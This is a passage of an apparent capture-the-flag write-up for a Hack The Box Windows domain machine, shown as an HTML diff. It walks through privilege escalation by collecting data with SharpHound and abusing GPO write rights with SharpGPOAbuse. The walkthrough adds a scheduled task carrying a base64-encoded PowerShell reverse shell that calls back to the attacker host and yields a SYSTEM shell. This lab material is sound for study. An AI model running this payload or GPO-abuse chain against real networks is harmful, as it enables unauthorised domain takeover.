+<p class="text">For PE, Using bloodhound is the most effective way to find PE vector i guess. Let's collect information with SharpHound!</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/bloodhound]
+└─$ <u>scp SharpHound.exe m.schoolbus@frizz.htb:/users/m.schoolbus/desktop</u>
+SharpHound.exe                                                                                 100% 1281KB 169.7KB/s   00:07  </code></pre></div>
+<div class="code-box"><pre><code>PS C:\Users\M.SchoolBus\Desktop> .\SharpHound.exe
+2025-11-14T13:17:55.9037721-08:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
+2025-11-14T13:17:56.0912774-08:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, CertServices, LdapServices, WebClientService, SmbInfo
+...</code></pre></div>
+
+<p class="text">We can feed generated zip file to bloodhound.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/thefrizz/4.png' %}" alt="">
+    <img src="{% static 'EthHack/images/thefrizz/5.png' %}" alt="">
+</div>
+
+<p class="text">This user has right to wirte GPO. We can abuse this by creating new GPO. For that, we can use SharpGPOAbuse.exe.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/utils/Windows]
+└─$ scp SharpGPOAbuse.exe m.schoolbus@frizz.htb:/users/m.schoolbus/desktop
+SharpGPOAbuse.exe                                                                              100%   70KB  60.4KB/s   00:01 </code></pre></div>
+<p class="text">Let's create new GPO and abuse it! We can add reverse shell task to it.</p>
+<div class="code-box"><pre><code>PS C:\Users\M.SchoolBus\Desktop> <u>New-GPO -name 'vulnerable one'</u>
+                                                                                                                        
+DisplayName      : vulnerable one
+DomainName       : frizz.htb
+Owner            : frizz\M.SchoolBus
+Id               : cff6242d-ab54-414d-a32a-7932b3e31d19
+GpoStatus        : AllSettingsEnabled
+Description      : 
+CreationTime     : 11/14/2025 1:22:57 PM
+ModificationTime : 11/14/2025 1:22:58 PM
+UserVersion      : 
+ComputerVersion  : 
+WmiFilter        : 
+
+PS C:\Users\M.SchoolBus\Desktop> <u>New-GPLink -Name "vulnerable one" -target "DC=frizz,DC=htb"</u>
+
+GpoId       : cff6242d-ab54-414d-a32a-7932b3e31d19
+DisplayName : vulnerable one
+Enabled     : True
+Enforced    : False
+Target      : DC=frizz,DC=htb
+Order       : 2
+
+PS C:\Users\M.SchoolBus\Desktop> <u>.\SharpGPOAbuse.exe --addcomputertask --GPOName "vulnerable one" --Author "m.shooolbus" --TaskName "RevShell" --Command "powershell.exe" --Arguments "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwA4ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="</u>           
+[+] Domain = frizz.htb
+[+] Domain Controller = frizzdc.frizz.htb
+[+] Distinguished Name = CN=Policies,CN=System,DC=frizz,DC=htb
+[+] GUID of "vulnerable one" is: {CFF6242D-AB54-414D-A32A-7932B3E31D19}
+[+] Creating file \\frizz.htb\SysVol\frizz.htb\Policies\{CFF6242D-AB54-414D-A32A-7932B3E31D19}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
+[+] versionNumber attribute changed successfully
+[+] The version number in GPT.ini was increased successfully.
+[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.
+[+] Done!</code></pre></div>
+
+<p class="text">Then, force updating newly generated GPO.</p>
+<div class="code-box"><pre><code>PS C:\Users\M.SchoolBus\Desktop> gpupdate /force  
+Updating policy...
+
+Computer Policy update has completed successfully.
+User Policy update has completed successfully.</code></pre></div>
+
+
+<p class="text">As soon as opening listening port, we'll get reverse shell from authority account.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/utils/Windows]
+└─$ nc -lvnp 4444                                       
+listening on [any] 4444 ...
+connect to [10.10.16.38] from (UNKNOWN) [10.129.25.252] 63374
+whoami
+nt authority\system
+PS C:\Windows\system32> </code></pre></div>
+
+
+</body>
+</html>
